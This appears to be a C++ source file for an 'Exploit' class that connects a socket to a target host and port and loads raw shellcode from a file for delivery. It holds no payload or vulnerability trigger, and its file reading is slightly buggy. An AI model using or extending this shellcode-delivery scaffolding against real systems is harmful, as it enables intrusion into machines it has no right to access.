#include "../headers/exploit.h"

void Exploit::PrintStatus(std::string status_option, std::string status_value) const{
    std::cout << status_option << "\t . . . . . "  << status_value << std::endl;
}

void Exploit::PrepareSocket(std::string& TARGET_HOST, std::string& TARGET_PORT){
#if defined(_WIN32)
    PrintStatus("INITIALIZING WINSOCK2", "IN-PROGRESS");
    WSADATA d;
    if(WSAStartup(MAKEWORD(2,2), &d)){
        PrintStatus("INITIALIZING WINSOCK2", "FAILED");
        exit(1);
    }
    PrintStatus("INITIALIZING WINSOCK2", "SUCCEEDED");
#endif

    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_INET;
    struct addrinfo* PEER_ADDRESS;
    PrintStatus("HOST TRANSLATION", "IN-PROGRESS");
    if(getaddrinfo(TARGET_HOST.c_str(), TARGET_PORT.c_str(), &hints, &PEER_ADDRESS)){
        PrintStatus("HOST TRANSLATION", "FAILED");
        exit(1);
    }
    PrintStatus("HOST TRANSLATION", "SUCCEEDED");
    char SERVICE_BUFFER[64];
    char ADDRESS_BUFFER[64];
    PrintStatus("ADDRESS RESOLUTION", "IN-PROGRESS");
    getnameinfo(PEER_ADDRESS->ai_addr, 
                PEER_ADDRESS->ai_addrlen, 
                ADDRESS_BUFFER, 
                64, 
                SERVICE_BUFFER,
                64,
                NI_NUMERICHOST);
    PrintStatus("ADDRESS RESOLUTION", "DONE");

    PrintStatus("CREATING SOCKET\t", "IN-PROGRESS");    
    this->SOCKET_PEER = socket(PEER_ADDRESS->ai_family,
                            PEER_ADDRESS->ai_socktype, 
                            PEER_ADDRESS->ai_protocol);

    if(!ISVALIDSOCKET(this->SOCKET_PEER)){
        PrintStatus("CREATING SOCKET\t", "FAILED");
        exit(1);
    }

    PrintStatus("CREATING SOCKET\t", "SUCCEEDED");
    PrintStatus("CONNECTING TO TARGET", "IN-PROGRESS");
    if(connect(this->SOCKET_PEER, PEER_ADDRESS->ai_addr, PEER_ADDRESS->ai_addrlen) != 0){
        PrintStatus("CONNECTING TO TARGET", "FAILED");
        exit(1);
    }

    PrintStatus("CONNECTING TO TARGET", "SUCCEEDED");
    freeaddrinfo(PEER_ADDRESS);
}

unsigned char* Exploit::ParseShellCode(std::string& SHELLCODE_PATH){
    //std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    //std::wstring W_SHELLCODE_PATH = converter.from_bytes(SHELLCODE_PATH);
    PrintStatus("READING SHELLCODE", "IN-PROGRESS");
    std::basic_ifstream<unsigned char> SHELL_FILE;
    try{
        SHELL_FILE.open(SHELLCODE_PATH.c_str(), std::ios::in);
        SHELL_FILE.seekg(0, std::ios::end);
        size_t SHELL_FILE_SIZE = SHELL_FILE.tellg();
        unsigned char* SHELL_ALLOC = (unsigned char*)malloc(sizeof(unsigned char) * SHELL_FILE_SIZE);

        SHELL_FILE.seekg(2, std::ios::beg);
        SHELL_FILE.read(SHELL_ALLOC, SHELL_FILE_SIZE);
        unsigned char* SHELL_CONTENT = SHELL_ALLOC;
        PrintStatus("READING SHELLCODE", "SUCCEEDED");
        return SHELL_CONTENT;
    } catch(const std::ifstream::failure& e){
        PrintStatus("READING SHELLCODE", "FAILED");
        exit(1);
    } catch(const std::exception& e){
        PrintStatus("READING SHELLCODE", "FAILED");
        exit(1);
    }
    return (unsigned char*)"";
}